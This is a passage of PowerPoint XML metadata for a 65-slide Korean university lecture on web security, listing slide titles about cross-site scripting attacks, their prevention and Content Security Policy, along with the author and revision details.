            </a:r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F08EF33-D5EA-4797-A98B-CD8676238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88AB-8E84-4C01-BDFA-16202E2AEB06}" type="slidenum">
              <a:rPr lang="ko-KR" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>65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0930745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E3DA18C2-75F1-4980-A5F0-165F6F71DE6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2274</TotalTime>
  <Words>2360</Words>
  <Application>Microsoft Macintosh PowerPoint</Application>
  <PresentationFormat>와이드스크린</PresentationFormat>
  <Paragraphs>447</Paragraphs>
  <Slides>65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65</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="76" baseType="lpstr">
      <vt:lpstr>맑은 고딕</vt:lpstr>
      <vt:lpstr>a고딕11</vt:lpstr>
      <vt:lpstr>a고딕12</vt:lpstr>
      <vt:lpstr>a고딕13</vt:lpstr>
      <vt:lpstr>a고딕14</vt:lpstr>
      <vt:lpstr>a고딕15</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Calibri Light</vt:lpstr>
      <vt:lpstr>Courier</vt:lpstr>
      <vt:lpstr>Wingdings</vt:lpstr>
      <vt:lpstr>추억</vt:lpstr>
      <vt:lpstr>Web Security 소수전공</vt:lpstr>
      <vt:lpstr>Today</vt:lpstr>
      <vt:lpstr>Cross-site scripting</vt:lpstr>
      <vt:lpstr>Cross-site scripting</vt:lpstr>
      <vt:lpstr>Cross-site scripting</vt:lpstr>
      <vt:lpstr>Cross-site scripting</vt:lpstr>
      <vt:lpstr>Cross-site scripting</vt:lpstr>
      <vt:lpstr>Cross-site scripting</vt:lpstr>
      <vt:lpstr>Cross-site scripting</vt:lpstr>
      <vt:lpstr>Cross-site scripting - XSS 공격 종류</vt:lpstr>
      <vt:lpstr>Reflected cross-site scripting</vt:lpstr>
      <vt:lpstr>Reflected cross-site scripting</vt:lpstr>
      <vt:lpstr>Reflected cross-site scripting</vt:lpstr>
      <vt:lpstr>Reflected cross-site scripting</vt:lpstr>
      <vt:lpstr>Reflected cross-site scripting</vt:lpstr>
      <vt:lpstr>XSS cheat sheet</vt:lpstr>
      <vt:lpstr>XSS cheat sheet</vt:lpstr>
      <vt:lpstr>XSS cheat sheet</vt:lpstr>
      <vt:lpstr>WAF</vt:lpstr>
      <vt:lpstr>WAF</vt:lpstr>
      <vt:lpstr>Reflected cross-site scripting</vt:lpstr>
      <vt:lpstr>Reflected cross-site scripting</vt:lpstr>
      <vt:lpstr>Reflected cross-site scripting</vt:lpstr>
      <vt:lpstr>Reflected cross-site scripting</vt:lpstr>
      <vt:lpstr>Impact of Reflected XSS</vt:lpstr>
      <vt:lpstr>Impact of Reflected XSS</vt:lpstr>
      <vt:lpstr>Stored XSS</vt:lpstr>
      <vt:lpstr>Stored XSS</vt:lpstr>
      <vt:lpstr>Stored XSS</vt:lpstr>
      <vt:lpstr>Stored XSS</vt:lpstr>
      <vt:lpstr>Stored XSS</vt:lpstr>
      <vt:lpstr>DOM-based XSS</vt:lpstr>
      <vt:lpstr>DOM-based XSS</vt:lpstr>
      <vt:lpstr>DOM-based XSS</vt:lpstr>
      <vt:lpstr>DOM-based XSS</vt:lpstr>
      <vt:lpstr>DOM-based XSS</vt:lpstr>
      <vt:lpstr>Exploiting DOM XSS</vt:lpstr>
      <vt:lpstr>Exploiting DOM XSS</vt:lpstr>
      <vt:lpstr>Exploiting DOM XSS</vt:lpstr>
      <vt:lpstr>Exploiting DOM XSS</vt:lpstr>
      <vt:lpstr>Exploiting DOM XSS</vt:lpstr>
      <vt:lpstr>How to prevent XSS</vt:lpstr>
      <vt:lpstr>How to prevent XSS</vt:lpstr>
      <vt:lpstr>How to prevent XSS</vt:lpstr>
      <vt:lpstr>How to prevent XSS</vt:lpstr>
      <vt:lpstr>How to prevent XSS</vt:lpstr>
      <vt:lpstr>How to prevent XSS</vt:lpstr>
      <vt:lpstr>How to prevent XSS</vt:lpstr>
      <vt:lpstr>How to prevent XSS using a template engine</vt:lpstr>
      <vt:lpstr>How to prevent XSS in PHP</vt:lpstr>
      <vt:lpstr>How to prevent XSS client-side in JavaScript</vt:lpstr>
      <vt:lpstr>How to prevent XSS client-side in JavaScript</vt:lpstr>
      <vt:lpstr>How to prevent XSS</vt:lpstr>
      <vt:lpstr>How to prevent XSS</vt:lpstr>
      <vt:lpstr>How to prevent XSS</vt:lpstr>
      <vt:lpstr>How to prevent XSS</vt:lpstr>
      <vt:lpstr>Content Security Policy</vt:lpstr>
      <vt:lpstr>Content Security Policy</vt:lpstr>
      <vt:lpstr>Content Security Policy</vt:lpstr>
      <vt:lpstr>Content Security Policy</vt:lpstr>
      <vt:lpstr>CSP 지시문</vt:lpstr>
      <vt:lpstr>CSP 지시문</vt:lpstr>
      <vt:lpstr>CSP 참고</vt:lpstr>
      <vt:lpstr>QnA</vt:lpstr>
      <vt:lpstr>부록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웹해킹 소수전공</dc:title>
  <dc:creator>lhm1024@korea.edu</dc:creator>
  <cp:lastModifiedBy>이효민[ 학부재학 / 사이버국방학과 ]</cp:lastModifiedBy>
  <cp:revision>9</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2021-06-24T06:49:54Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2022-11-04T05:35:08Z</dcterms:modified>
</cp:coreProperties>
</file>